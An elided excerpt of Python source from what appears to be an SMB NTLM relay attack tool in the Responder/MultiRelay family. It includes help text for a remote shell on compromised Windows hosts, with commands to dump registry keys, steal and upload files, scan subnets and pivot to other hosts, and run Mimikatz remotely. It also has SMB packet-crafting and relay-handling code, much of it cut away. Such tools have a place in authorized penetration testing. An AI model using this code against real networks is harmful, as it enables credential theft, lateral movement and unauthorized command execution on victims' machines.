...
try:
    ...
    print(
        "Warning: readline module is not available, you will not be able to use the arrow keys for command history"
    )
    pass
...
def ShowHelp():
    ...
    print(
        color("regdump KEY", 8, 1)
        + "        -> Dump an HKLM registry key (eg: regdump SYSTEM)"
    )
    print(
        color("read Path_To_File", 8, 1)
        + "  -> Read a file (eg: read /windows/win.ini)"
    )
    print(
        color("get  Path_To_File", 8, 1)
        + "  -> Download a file (eg: get users/administrator/desktop/password.txt)"
    )
    print(
        color("delete Path_To_File", 8, 1)
        + "-> Delete a file (eg: delete /windows/temp/executable.exe)"
    )
    print(
        color("upload Path_To_File", 8, 1)
        + "-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\"
    )
    print(
        color("runas  Command", 8, 1)
        + "     -> Run a command as the currently logged in user. (eg: runas whoami)"
    )
    print(
        color("scan /24", 8, 1)
        + "           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to"
    )
    print(
        color("pivot  IP address", 8, 1)
        + "  -> Connect to another host (eg: pivot 10.0.0.12)"
    )
    print(
        color("mimi  command", 8, 1)
        + "      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)"
    )
    print(
        color("mimi32  command", 8, 1)
        + "    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)"
    )
    print(
        color("lcmd  command", 8, 1)
        + "      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)"
    )
...
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../")))
from responder.src.settings import LOGS_PATH

# Use centralized logging configuration
Logs = logging
Logs.basicConfig(
    filemode="w",
    filename=LOGS_PATH / "SMBRelay-Session.txt",
    level=logging.INFO,
        ...
        try:
            ...
            if Packet_NTLM == "\x01":
                ...
                if smbdata[8:10] == "\x72\x00":
                    head = SMBHeader(
                        cmd="\x73", flag1="\x18", flag2="\x43\xc8", mid="\x02\x00"
                    )
                ...
                Buffer_Ans.calculate(
                    str(ExtractRawNTLMPacket(smbdata))
                )  # Retrieve challenge message from smb
                key = ExtractHTTPChallenge(
                    smbdata, Pivoting
    ...
    def handle(self):
        ...
        try:
            ...
            if data[8:10] == b"\x72\x00":
                ...
                Body = SMBRelayNegoAns(
                    Dialect=Parse_Nego_Dialect(NetworkRecvBufferPython2or3(data))
                )
            ...
            if IsSMBAnonymous(NetworkSendBufferPython2or3(data)):
                ...
                if Username is not None:
                    ...
                    head = SMBHeader(
                        ...
                        flag1="\x18",
                        flag2="\x43\xc8",
                        uid=smbdata[32:34].decode("latin-1"),
                        mid="\x03\x00",
                    )
...
def RunShellCmd(data, s, clientIP, Target, Username, Domain):
    ...
    if data[8:10] == b"\x73\x5e":
        print(
            "[+] Relay failed, NO_LOGON_SERVER returned. Credentials are probably good, but the PDC is either offline or inexistant.\n"
        )
        del ShellOpen[:]
        return False
    ...
    while True:
        ...
        if data[8:10] == b"\x75\x00":
            ...
            if RunAs:
                if os.path.isfile(RunAsFileName):
                    ...
                    print(
                        RunAsFileName + " does not exist, please specify a valid file."
                    )
                    del Cmd[:]
            ...
            if Pivot:
                if Pivot[0] == Target[0]:
                    print(
                        "[Pivot Verification Failed]: You're already on this host. No need to pivot."
                    )
                    del Pivot[:]
                    del Cmd[:]
                else:
                    if ShowSigning(Pivot[0]):
                        ...
                        if os.path.isfile(RunAsFileName):
                            ...
                            if Status == False:
                                print(
                                    "[Pivot Verification Failed]: This user doesn't have enough privileges on "
                                    + Pivot[0]
                                    + " to pivot. Try another host."
                                )
                                del Cmd[:]
                                del Pivot[:]
                        else:
        ...
        if (
            data[8:10] == b"\x2d\x34"
        ):  # We confirmed with OpenAndX that no file remains after the execution of the last command. We send a tree connect IPC and land at the begining of the command loop.
            head = SMBHeader(
                cmd="\x75",
                flag1="\x18",
                flag2="\x07\xc8",
